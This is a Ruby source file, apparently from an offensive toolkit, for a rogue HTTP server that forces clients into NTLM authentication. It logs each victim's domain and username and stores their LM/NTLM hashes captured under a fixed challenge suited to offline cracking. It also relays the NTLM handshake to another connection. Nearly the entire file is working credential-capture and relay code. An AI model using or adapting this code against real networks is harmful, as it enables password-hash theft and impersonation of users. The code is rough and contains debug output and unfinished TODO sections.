#!/usr/bin/env ruby1.8
require 'rubygems'
require 'webrick'
require 'base64'
require 'zfntlm'
require 'zfclient'
# notes: need to track by IP since im guessing wpad won't track cookies
# will redir keep authing? let's find out!

module ZFhttpd
  class Server
    def initialize(ip, port)
      @server = TCPServer.open(ip, port)
    rescue Errno::EADDRINUSE, Errno::EACCES
      puts 'HTTP - PORT IN USE OR PERMS'
      return false
    end

    def start
      puts 'Starting httpd server'
      zfdb = ZFdb::DB.new
      loop do
        Thread.start(@server.accept) do |cli|
          uid = sessid = clientconn = nil
          begin
            # cli = @server.accept #make sure you recomment dumbass
            print 'NEW HTTPd CONNECTION [ '
            print cli.peeraddr[3]
            puts ' ]!'
            count = 1
            request = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
            while request.parse(cli)
              # print 'Request: '
              # puts request.request_uri
              # puts request['User-Agent']
              response = WEBrick::HTTPResponse.new(WEBrick::Config::HTTP)
              response.content_type = 'text/html'
              if request['Authorization']
                ntlmdata = Base64.decode64(request['Authorization'][/NTLM (.*)/ , 1].strip)
                if (ntlmdata[8..11] == '\x01\x00\x00\x00')
                  response.status = 401
                  ntlmmsg = ZFNtlm::Message.new
                  if uid.nil?
                    puts 'FIRST TIMER!'
                    @type1 = ntlmdata
                    response['WWW-Authenticate'] = 'NTLM ' +
                      Base64.encode64(ntlmmsg.buildtype2).gsub('\n', '')
                  else
                    begin
                      clientconn = ZFClient::Router.new(uid, 15)
                      response['WWW-Authenticate'] = 'NTLM ' +
                        Base64.encode64(clientconn.sendtype1(ntlmdata)).gsub('\n', '')
                    rescue
                      puts $ERROR_INFO
                    end
                  end

                elsif (ntlmdata[8..11] == '\x03\x00\x00\x00')
                  ntlmmsg = ZFNtlm::Message.new(ntlmdata)
                  ntlmmsg.parsetype3
                  if uid.nil?
                    puts 'HTTP user: ' + ntlmmsg.domain + '\\' +
                      ntlmmsg.username
                    uid = zfdb.Getuserid(ntlmmsg. username, ntlmmsg. domain)
                    sessid = zfdb.Newsession(uid, ntlmmsg.hostname, 0,
                                             cli.peeraddr[3], 2,
                                             request.host +
                                             request.unparsed_uri)
                    zfdb.StoreHash(uid, ntlmmsg.lmhash, ntlmmsg.ntlmhash,
                                   '1122334455667788', sessid,
                                   Base64.encode64(ntlmdata))
                  else
                    Thread.start { clientconn.sendtype3(ntlmdata) }
                  end

                  response.status = 302
                  count += 1

                  # TODO: DO TYPE 3 STUFF!!!!

                  response['Location'] = 'http://' + request.host +
                    '/?id=' + count.to_s

                else
                  puts 'else else'
                end
              else
                # puts request['User-Agent']
                response['WWW-Authenticate'] = 'NTLM'
                # puts 'other else'
                response.status = 401
              end
              # puts 'sending!'
              response['Connection'] = 'Keep-Alive'
              response['Keep-Alive'] = 'timeout=5'
              response.send_response(cli)
              request = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
            end
          rescue
            zfdb.Endsession(sessid)
            puts 'Session Died for ' + uid.to_s + ' after ' +
              count.to_s + ' times'
          end
        end
      end
    end

    def close
      @server.close
    end
  end
end
